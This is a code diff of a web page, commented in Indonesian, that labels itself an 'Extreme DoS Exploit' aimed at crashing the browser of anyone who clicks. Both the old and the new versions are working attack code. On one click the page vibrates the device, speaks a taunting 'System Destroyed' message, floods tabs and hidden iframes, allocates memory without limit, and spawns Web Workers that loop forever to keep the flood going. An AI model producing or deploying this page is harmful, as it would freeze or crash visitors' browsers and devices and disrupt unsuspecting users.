@@ -3,24 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ULTIMATE BROWSER KILLER (DoS)</title>
+    <title>Extreme DoS Exploit</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; cursor: pointer; user-select: none; overflow: hidden; }
         .panel { background: #1e1e1e; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 500px; width: 100%; border: 1px solid #333; }
-        h1 { font-size: 28px; color: #ff0000; margin-bottom: 15px; text-shadow: 0 0 20px #ff0000; animation: pulse 0.5s infinite; }
+        h1 { font-size: 28px; color: #ff4444; margin-bottom: 15px; text-shadow: 0 0 10px #ff4444; }
         p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
         #status { margin-top: 20px; font-weight: bold; color: #ff9800; font-size: 14px; font-family: monospace; background: #111; padding: 10px; border-radius: 6px; }
-        .warning { background: #330000; color: #ff0000; padding: 10px; border-radius: 6px; margin-bottom: 20px; font-size: 14px; font-weight: bold; border: 2px solid #ff0000; animation: pulse 1s infinite; }
-        @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.5; } }
+        .warning { background: #331111; color: #ff4444; padding: 10px; border-radius: 6px; margin-bottom: 20px; font-size: 13px; border: 1px solid #ff4444; }
     </style>
 </head>
 
 <body>
 <div class="panel" id="main-panel">
-    <div class="warning">⚠️ KLIK = BROWSER ANDA AKAN HANCUR TOTAL!</div>
-    <h1>ULTIMATE BROWSER KILLER</h1>
-    <p>Multi-Worker Bombing + Memory Exhaustion + Iframe Flooding + AudioContext Bombing.</p>
+    <div class="warning">⚠️ PERINGATAN: Klik di mana saja akan memicu TOTAL BROWSER CRASH (DoS).</div>
+    <h1>Extreme DoS Exploit</h1>
+    <p>Menggunakan Multi-Worker, Iframe Flooding, dan Memory Bombing.</p>
     <div id="status" role="status">Menunggu klik...</div>
 </div>
 
@@ -29,77 +28,62 @@
     let isRunning = false;
     let totalTabs = 0;
     let totalWorkers = 0;
-    let totalIframes = 0;
-    let totalAudio = 0;
     let memoryBomb = [];
-    let audioContexts = [];
 
-    // 1. Efek Getar & Suara (Shock Effect)
+    // 1. Efek Getar & Suara
     function efekHacker() {
         if (navigator.vibrate) {
-            navigator.vibrate([2000, 100, 2000, 100, 2000]); // Getar 2 detik
+            navigator.vibrate([1000, 200, 1000, 200, 1000]);
         }
         if ('speechSynthesis' in window) {
             const msg = new SpeechSynthesisUtterance('System Destroyed by Waguri');
             msg.lang = 'en-US';
-            msg.rate = 0.5; // Suara lambat & menakutkan
             window.speechSynthesis.speak(msg);
         }
     }
 
-    // 2. Tab Flooding
+    // 2. Fungsi Membuka Tab
     function bukaTab() {
         try {
-            const win = window.open('about:blank', '_blank');
-            if (win) totalTabs++;
+            const win = window.open('https://google.com', '_blank');
+            if (win) {
+                totalTabs++;
+            }
         } catch (e) {}
     }
 
-    // 3. Memory Bombing (Alokasi RAM 50MB per tembakan)
+    // 3. Memory Bombing (Alokasi RAM secara masif)
     function memoryBombing() {
         try {
-            const arr = new Uint8Array(50 * 1024 * 1024); // 50MB
+            // Alokasi array 10MB secara terus-menerus
+            const arr = new Uint8Array(10 * 1024 * 1024); 
             memoryBomb.push(arr);
         } catch (e) {
-            // RAM penuh, browser mulai crash
+            // Jika RAM penuh, browser akan crash
         }
     }
 
-    // 4. Iframe Flooding (Membuat iframe tak terbatas)
+    // 4. Iframe Flooding
     function buatIframe() {
         try {
             const iframe = document.createElement('iframe');
             iframe.src = 'about:blank';
             iframe.style.display = 'none';
             document.body.appendChild(iframe);
-            totalIframes++;
+            iframe.contentWindow.document.write('<h1>HACKED</h1>');
         } catch (e) {}
     }
 
-    // 5. AudioContext Bombing (Membuat audio server tak terbatas)
-    function audioBombing() {
-        try {
-            const ctx = new (window.AudioContext || window.webkitAudioContext)();
-            const osc = ctx.createOscillator();
-            osc.frequency.value = Math.random() * 20000; // Frekuensi acak
-            osc.connect(ctx.destination);
-            osc.start();
-            audioContexts.push(ctx);
-            totalAudio++;
-        } catch (e) {}
-    }
-
-    // 6. Worker Spawner (Membuat worker tak terbatas)
+    // 5. Worker Builder (Masing-masing worker akan spawn worker baru)
     function spawnWorker() {
         try {
             const workerCode = `
                 self.onmessage = function(e) {
                     if (e.data === 'START') {
+                        // Loop super cepat
                         while(true) {
-                            self.postMessage('TAB');
+                            self.postMessage('OPEN');
                             self.postMessage('MEMORY');
-                            self.postMessage('IFRAME');
-                            self.postMessage('AUDIO');
                         }
                     }
                 };
@@ -108,11 +92,12 @@
             const worker = new Worker(URL.createObjectURL(workerBlob));
 
             worker.onmessage = function(e) {
-                // Memicu fungsi di Main Thread
-                if (e.data === 'TAB') queueMicrotask(bukaTab);
-                if (e.data === 'MEMORY') queueMicrotask(memoryBombing);
-                if (e.data === 'IFRAME') queueMicrotask(buatIframe);
-                if (e.data === 'AUDIO') queueMicrotask(audioBombing);
+                if (e.data === 'OPEN') {
+                    queueMicrotask(bukaTab);
+                }
+                if (e.data === 'MEMORY') {
+                    queueMicrotask(memoryBombing);
+                }
             };
 
             worker.postMessage('START');
@@ -120,33 +105,32 @@
         } catch (e) {}
     }
 
-    // 7. Mulai Serangan
+    // 6. Mulai Serangan
     function mulaiSerangan() {
         if (isRunning) return;
         isRunning = true;
         
         statusDiv.textContent = "MEMULAI TOTAL DESTRUCTION!";
-        statusDiv.style.color = "#ff0000";
+        statusDiv.style.color = "#ff4444";
 
         efekHacker();
 
-        // Spawn 10 Web Workers awal
-        for (let i = 0; i < 10; i++) {
+        // Spawn 5 Web Workers secara bersamaan
+        for (let i = 0; i < 5; i++) {
             spawnWorker();
         }
 
-        // Loop Iframe Flooding, Memory, Audio di Main Thread
+        // Loop Iframe Flooding dan Tab Flooding di Main Thread
         setInterval(() => {
             buatIframe();
-            memoryBombing();
-            audioBombing();
             bukaTab();
+            memoryBombing();
             
-            statusDiv.textContent = `W:${totalWorkers} | T:${totalTabs} | I:${totalIframes} | A:${totalAudio} | M:${memoryBomb.length * 50}MB`;
-        }, 5); // Setiap 5ms
+            statusDiv.textContent = `Workers: ${totalWorkers} | Tabs: ${totalTabs} | Memory: ${memoryBomb.length * 10}MB`;
+        }, 10); // Setiap 10ms
 
-        // Worker Creator Loop (Spawn worker baru setiap 100ms)
-        setInterval(spawnWorker, 100);
+        // Worker Creator Loop (Spawn worker baru setiap 500ms)
+        setInterval(spawnWorker, 500);
     }
 
     // Hanya butuh SATU klik
